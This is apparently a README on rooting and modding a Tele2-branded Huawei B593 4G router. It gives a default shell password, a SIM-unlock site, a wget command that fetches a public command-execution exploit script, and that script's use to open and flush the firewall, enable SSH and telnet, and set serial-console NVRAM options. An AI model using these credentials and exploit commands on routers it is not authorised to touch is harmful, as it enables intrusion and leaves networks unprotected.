# Huawei 593 - Tele2

### For sim unlock:

http://huaweicodecalculator.com/credits - yup, it actually works fine for this router :)

### Default Shell Login For This Router:

    login: admin
     pass: HW4GCPE

### Download B593cmd.pl:

Credits goes to: Jari Turkia 

    wget http://opensource.hqcodeshop.com/Huawei%20B593/exploit/B593cmd.pl
    chmod +x B593cmd.pl

### Execute commands with

    ./B593cmd.pl <ip> <admin_pw> "command_to_execute"

### Allow incoming connections

    ./B593cmd.pl 192.168.1.3 odemnn  "iptables -I INPUT -i br0 -j ACCEPT"

### SSH:

    ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -c 3des-cbc admin@192.168.1.3 -s /bin/sh

### Clear all iptables

    ./B593cmd.pl 192.168.1.1 admin "iptables -nL INPUT"
    ./B593cmd.pl 192.168.1.3 odemnn "iptables -P INPUT ACCEPT;iptables -P FORWARD ACCEPT;iptables -P OUTPUT ACCEPT;iptables -F;iptables -X

### Login
 
    telnet 192.168.1.3

### Enable serial console

Enable CFE and normal boot (B593.trx) serial console

    nvram set console_disable=0

Enable boot_wait with 10 second delay for more recovery options

    nvram set boot_wait=on
    nvram set wait_time=10

Boot regular OS (B593.trx). Use boot_part=1 for recovery OS (B593-small.trx)
    
    nvram set boot_part=0

Write changes made to NVRAM
 
    nvram commit

### Backup 

![Screenshot](pics/backup-script_tele2.gif)

Run script in scripts/backup-script.sh for backup as above

References

<br>http://opensource.hqcodeshop.com/Huawei%20B593/exploit/B593cmd.pl
<br>https://blog.hqcodeshop.fi/archives/130-Exploit-Running-commands-on-B593-shell.html
<br>http://blog.asiantuntijakaveri.fi/search/label/b593
<br>http://blog.asiantuntijakaveri.fi/2013/08/gaining-root-shell-on-huawei-b593-4g.html
<br>http://blog.asiantuntijakaveri.fi/2014/08/persistent-customizations-to-huawei.html
<br>https://dlcdnets.asus.com/pub/ASUS/wireless/RT-N53/FW_RT_N53_30043763754.zip

### CONTACT 

If you have problems, questions, ideas or suggestions please contact me by posting to wuseman@nr1.nu

### WEB SITE

Visit my websites and profiles for the latest info and updated tools

https://github.com/wuseman/ && https://nr1.nu && https://stackoverflow.com/users/9887151/wuseman

### END!
